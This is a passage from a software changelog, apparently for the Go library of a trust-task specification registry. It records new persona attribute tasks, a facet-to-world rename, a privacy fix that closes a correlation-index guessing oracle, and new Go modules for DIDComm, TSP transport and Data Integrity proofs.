    as it is submitted, and the second submission counts as readily as the first.

  vetting/attestation declares identifierScope: any. Nothing in it needs a
  reusable identifier — the community never sees the document, and the applicant
  only needs the identifier the session was held under — so a pair that runs the
  whole vetting exchange pairwise loses nothing.

  Bindings regenerated for all four languages; conformance checks agree.

## 0.2.1 — 2026-09-23


### Added

- **persona**: Attribute/get — read one attribute, by identifier (#616)

The family had no narrow read, and the shape of the workaround is the
  argument for the task. A client revealing one value called
  `persona/attribute/list` with a `typePrefix` and `includeValues`, then
  filtered to the id it already held — so showing one email address
  decrypted and returned every email address the holder has, and the audit
  trail recorded a listing of the pool rather than a decision about one
  fact.

  - Values are withheld unless asked for, and a `sensitivity: high` value
    needs a second flag, on the same two-step as `attribute/list`. A
    withheld value is stated (`valueWithheld`), never left to inference: a
    consumer reading an absent value as "there is none" shows the holder an
    empty field where their passport number is.
  - `version` reads a retained earlier version, which is what makes "what
    did I show them in March" answerable — a disclosure record and a pinned
    entry both name one. A purged version is `versionPurged`, never a
    silent fall back to the current value.
  - `retainedVersions` names the versions still held, so a holder deciding
    whether to purge can see what purging would take away rather than being
    asked to make an irreversible decision blind.

  One identifier, never a list: a maintainer that accepted several would
  recreate the enumeration the task exists to avoid, one call later.

## 0.2.0 — 2026-09-23


### Added

- **persona**: An arrangement of faces is a world, not a facet (#610)

`face` and `facet` share a stem and name different things — a projection
  of the pool, and an arrangement of those projections. Every consumer's UI
  had already resolved it by saying "world" on screen while the wire said
  facet, which leaves the collision in place for anyone reading both.

  - `persona/world/{put,list,delete}/1.0` — the same tasks, with `facetId`
    as `worldId`. `persona/facet/*` is retired, `supersededBy` the new
    slug, so documents already issued stay verifiable.
  - `persona/correlation/analyze/1.1` — `facetId`, `facetIds` and
    `crossesFacets` become `worldId`, `worldIds` and `crossesWorlds`. A
    breaking rename carried as a MINOR increment, which SPEC §5.2 permits
    for a `draft`. 1.0 is retired in its favour.
  - `_shared/0.1` gains `WorldColour`, the same eight colours.
    `FacetColour` stays because a retired specification's schema is frozen
    and still references it.

  Nothing else moves: same members, same semantics, same error codes.
  `facet` survives elsewhere in the registry in its ordinary English sense
  (a facet of a trust record, of an account) and is left alone.



### Fixed

- **persona**: Local/profile/put answers the correlation index only to the holder (#609)

`correlation.matchesPoolValue` is a yes/no on "does the holder hold this
  exact value anywhere", computed from the agent-wide index — and the task
  is context-scoped, so the response handed that answer to any caller
  authorized in one context.

  A caller that can write is a caller that can guess: one value per write,
  unbounded, each answer confirming or eliminating one. No value crosses
  the boundary and none needs to — for a name, an address or a date of
  birth, confirmation is disclosure, and the guesser is inside a single
  context learning about all of them.

  So `correlation` becomes conditional: a maintainer MUST include it only
  for a caller authorized to read across the holder's contexts, and MUST
  omit the member entirely otherwise. Omit rather than soften — a coarser
  signal is still an oracle, only a slower one. The holder is still owed
  the warning that a throwaway is reusing a real value, through an audit
  entry or the holder-reach correlation task.

  The schema's own description said the index is answerable "only to the
  holder" while this response answered it to anyone in the context. The
  prose and the conformance rules now say what that means for this member.

## 0.1.21 — 2026-09-23

## 0.1.20 — 2026-09-22

## 0.1.19 — 2026-09-22

## 0.1.18 — 2026-09-22

## 0.1.17 — 2026-09-22

## 0.1.16 — 2026-09-21

## 0.1.15 — 2026-09-21


### Specifications

- Bring framework 0.6.0 into the registry (SPEC.md + specs/_framework/0.6) (#555)

Companion to trustoverip/dtgwg-trust-tasks-spec#18. Publishes the 0.6
  envelope schema (0.5's shape unchanged, so 0.6.0 becomes targetable; no
  spec is re-targeted) and brings the SPEC.md mirror to 0.6: version and
  date header, plus the Appendix B entry.

## 0.1.14 — 2026-09-21

## 0.1.13 — 2026-09-21

## 0.1.12 — 2026-09-21

## 0.1.11 — 2026-09-21

## 0.1.10 — 2026-09-21

## 0.1.9 — 2026-09-20


### Specifications

- **vtc/endorsement-types/delete**: A criterion requiring the type also blocks its deletion (#523)

The spec described one kind of reference — a live endorsement — and the
  `inUse` refusal as being about orphaned endorsements alone. A second kind
  exists wherever the consumer also holds admission criteria: a criterion
  requiring statements of the type is left asking applicants for evidence the
  community no longer recognises. Where registering such a criterion against
  an unregistered type is itself refused, deleting the type strands the
  criterion in a state it could not have been created in.

  `inUse` now covers both, and gains a `detailsSchema` so a consumer that can
  determine both reports which applies rather than leaving the caller to
  parse prose. `liveEndorsements` and `criteria` are each optional, because
  neither an endorsement store nor a criteria registry is mandatory — and the
  spec says plainly that an absent member means "not applicable here", not
  "none found", so a caller cannot read silence as an all-clear.

  Conformance asks a consumer that can determine both to gather both before
  refusing. Refusing on the first found turns one determination into as many
  round trips as there are kinds of reference, each ending in the same code.

  Security & Privacy gains what the refusal discloses: `details` names
  criteria by identifier, which is a governance fact the authorised
  administrator can already enumerate, and is reachable only after the
  community-admin capability has been verified.

  In place on 0.1 rather than a new version: the spec is `draft`, no payload
  or response shape changes, and no previously-valid document becomes
  invalid.

  Implemented in verifiable-trust-infrastructure#1584, which added the
  criterion check and reported both causes in one refusal.

## 0.1.8 — 2026-09-20

## 0.1.7 — 2026-09-19

## 0.1.6 — 2026-09-17

## 0.1.5 — 2026-09-16


### Added

- **go-capability-client**: Capability wire client for Go (trust-tasks-go/capabilityclient) (#498)

The Go port of the Rust trust-tasks-capability-client crate: pure wire logic,
  no crypto and no transport. Document builders for the governance/capability/*
  (list/enable/disable) and git-trust/* (grant/revoke) families, DIDComm envelope
  parsing, and reply classification — so a capability producer and a management UI
  cannot drift on the contract.

  A separate nested module like tsp/proof/didcomm, but with no third-party
  dependency at all (only the core, for Document and SlugFromTypeURI).

  - Builders mint a fresh id + issuedAt per call; NewAttempt() re-stamps a built
    document under a fresh id and clears proof (a SPEC §8.4 new attempt, distinct
    from a bit-for-bit retry the consumer's item-11 record absorbs).
  - ClassifyGitTrustReply / ParseCapabilityReply correlate on threadId first
    (§4.9) and key idempotent success on the SPEC §8.5 extended error code (both
    spellings), never the non-normative free-text message; the free-text path is
    opt-in via ReplyPolicy.

  Adds a capabilityclient job to go.yml, the Go capability-client cell to the
  capability matrix, and documents the module in CLAUDE.md. 12 tests, go 1.22 +
  stable, gofmt clean.

## 0.1.4 — 2026-09-16


### Added

- **go-didcomm**: DIDComm v2.1 transport binding for Go (trust-tasks-go/didcomm) (#495)

The bindings/didcomm/0.2 binding for Go, rolled on the standard library. A
  separate nested module like tsp and proof so the core stays dependency-free,
  and like proof it pulls in no third-party code: DIDComm v2.1 authcrypt
  (ECDH-1PU key agreement + A256KW key wrapping + A256CBC-HS512 content
  encryption, over X25519) on crypto/ecdh, with the RFC 3394 key-wrap (pinned to
  the RFC's test vector) and RFC 7518 content encryption written in-module.

  aries-framework-go was evaluated and rejected: its packer is a low-level JWE
  primitive needing a full KMS/Crypto/Storage/VDR provider and raw key bytes, it
  does not build/parse the v2 message envelope or verify sender_kid, and the
  framework is archived. Rolling our own keeps the four bindings aligned and
  PQC-extensible.

  The verified skid is authenticated by the ECDH-1PU static secret (a forged
  skid fails the key unwrap) and becomes the §4.8.1 transport-authenticated
  sender; anoncrypt/plaintext are rejected (binding §2/§4). Key-based like tsp
  (a ResolveSender callback, no DID resolution); the consumer keeps the §7.2
  item-11 duplicate-execution record on by default (binding §6) and routes a
  thread-header disagreement as malformedRequest (binding §3.1).

  Adds a didcomm job to go.yml, the Go implementation to the didcomm/0.2 binding
  registry, the Go binding:didcomm cell to the capability matrix, and documents
  the module in CLAUDE.md. Not release-wired yet; a shared cross-library authcrypt
  fixture is a follow-up.

## 0.1.3 — 2026-09-16


### Added

- **go-proof**: Data Integrity proofs for Go (trust-tasks-go/proof) (#493)

A ProofVerifier and signer for the core module's proof seam, rolled on the
  Go standard library — eddsa-jcs-2022 (Ed25519) and ecdsa-jcs-2019
  (P-256/P-384), did:key only, no network. A separate nested module like
  trust-tasks-go/tsp so the core stays dependency-free, but with no third-party
  code at all: the JCS canonicaliser and base58btc codec are written in-module.

  Byte-compatible with the Rust and TypeScript proof libraries — a test
  reproduces the shared eddsa-jcs-2022 fixture's proofValue exactly. Verifier
  binds the proof to the in-band issuer and returns a typed *proof.Error whose
  Kind stays in the logs (every failure is proofInvalid on the wire, SPEC
  §10.4).

  Adds a proof job to go.yml (the core ./... jobs do not reach a nested module),
  marks the Go proof cell shipped in the implementations matrix, and documents
  the module in CLAUDE.md. Not wired into a release yet — unlike tsp there is no
  blocker, so a publish-go-style tag job is a clean follow-up.

## 0.1.2 — 2026-09-16


### Added

- **go-tsp**: TSP transport binding for Go (trust-tasks-go/tsp) (#486)

A separate nested Go module so the core stays dependency-free: PackTrustTask / UnpackTrustTask for HPKE-sealed Direct TSP messages on affinidi-tsp-go, and Consumer.Receive, the guarded inbound path running SPEC §7.2 with the item-11 record on by default. The sealed {type, document} envelope matches the Rust crate and Dart package (pinned by a test).

  Not released: affinidi-tsp-go has no tag, so it is required at a pseudo-version and there is no trust-tasks-go/tsp/v* release wiring yet; go get resolves the pseudo-version from the public repo. go.yml gets a dedicated tsp job; the core ./... jobs exclude the nested module.

## 0.1.1 — 2026-09-16

## 0.1.0

### Added

- Initial release: generated payload types for every specification in the
  registry, and the hand-written SPEC.md §7.2 consumer pipeline in
  `trusttasks/`.
